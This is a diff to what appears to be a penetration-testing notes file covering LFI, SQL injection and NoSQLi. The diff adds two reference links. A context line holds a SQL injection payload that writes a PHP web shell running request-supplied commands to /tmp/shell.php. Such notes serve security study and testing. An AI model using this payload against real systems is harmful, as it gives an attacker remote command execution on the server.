@@ -185,6 +185,7 @@ sudo systemctl restart httpd
 ## LFI
 
 - https://www.clever-age.com/owasp-local-remote-file-inclusion-lfi-rfi/
+- https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html
 
 `Protection`: 
 
@@ -262,6 +263,7 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 
 - https://websec.wordpress.com/tag/sql-filter-bypass/
 - https://johnermac.github.io/notes/ewptx/sqlievasion/
+- http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/
 
 ## NoSQLi
 
